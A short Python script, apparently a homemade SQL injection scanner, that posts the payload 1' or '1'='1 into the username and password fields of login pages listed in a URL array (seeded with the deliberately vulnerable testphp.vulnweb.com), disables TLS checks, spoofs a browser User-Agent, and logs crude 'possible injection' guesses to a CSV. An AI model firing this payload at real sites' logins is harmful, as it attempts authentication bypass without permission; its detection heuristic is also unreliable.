import requests
import csv

# List of website URLs
websites = [
    'http://testphp.vulnweb.com/login.php',
    # Add more URLs as needed
]

# Payload for injection attack (assuming it's a SQL injection)
payload = "1' or '1'='1"

# Headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
}

# List to store results
results = []

# Iterate over the list of websites
for url in websites:
    try:
        # Send a POST request with the payload
        response = requests.post(url, data={'username': payload, 'password': payload}, headers=headers, timeout=10, verify=False)

        # Check the response for common signs of a successful injection
        if 'error' in response.text.lower() or 'exception' in response.text.lower() or response.status_code != 200:
            status = 'Possible SQL injection detected'
        else:
            status = 'No injection detected'
        
        # Append result to the list
        results.append({'Website': url, 'Status': status})
        
    except requests.RequestException as e:
        status = f'Error occurred: {e}'
        results.append({'Website': url, 'Status': status})

# Write results to CSV file
with open('sql results.csv', 'w', newline='') as csvfile:
    fieldnames = ['Website', 'Status']
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

    writer.writeheader()
    for result in results:
        writer.writerow(result)

print('Results saved to results.csv')
